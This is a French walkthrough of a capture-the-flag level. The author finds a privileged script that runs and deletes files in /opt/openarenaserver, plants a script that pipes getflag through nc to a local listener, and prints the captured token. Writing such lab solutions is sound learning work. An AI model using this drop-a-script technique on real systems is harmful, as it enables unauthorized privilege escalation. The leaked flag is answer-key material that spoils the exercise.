```bash
$ ls -l
total 0
```

Ca commence bien, il n'y a rien dans le répertoire.

Je pars donc à la recherche de fichiers associes a level05 ou flag05

```bash
$ find / -user level05 2>/dev/null
/dev/pts/0
/proc/4215
/proc/4215/task
/proc/4215/task/4215
/proc/4215/task/4215/attr
/proc/4215/net
/proc/4215/attr
...

# Bon rien de particulier... Je cherche pour flag05

$ find / -user flag05 2>/dev/null
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```

Okay, on a un fichier interessant, je vais donc l'ouvrir pour voir ce qu'il contient.

```bash
$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

Le script execute tous les fichiers dans /opt/openarenaserver et les supprime ensuite...

Pour test je cree un fichier dans ce dossier, le rend executable et j'attends pour voir s'il disparait

...

Au bout de 10-15 secondes, le fichier a disparu.

Je vais donc creer un fichier qui va executer `getflag` et m'envoyer le resultat via `nc` sur ma machine.

```bash
$ echo 'getflag | nc localhost 4000' > /opt/openarenaserver/flag05.sh && chmod +x /opt/openarenaserver/flag05.sh && nc -l 4000
```

J'attend un petit peu et bim~

```bash
Check flag.Here is your token : viuaaale9huek52boumoomioc
```